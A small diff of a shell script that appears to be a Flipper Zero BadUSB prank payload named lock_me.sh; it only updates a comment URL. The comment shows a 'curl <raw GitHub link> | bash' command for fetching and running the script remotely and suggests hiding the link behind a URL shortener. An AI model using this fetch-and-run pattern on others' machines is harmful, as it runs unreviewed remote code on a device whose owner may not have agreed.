@@ -2,7 +2,7 @@
 
 # simplesy way to run it will be with curl, you can replace direct URL with HRL shortener
 # curl <RAW link> | bash
-# curl https://github.com/Landsil/flipper_script/raw/main/bad_usb/lock_me.sh | bash
+# curl https://raw.githubusercontent.com/Landsil/flipper_things/main/badusb/curl_payloads/lock_me.sh | bash
 
 trap "tput reset; tput cnorm; exit" 2
 clear
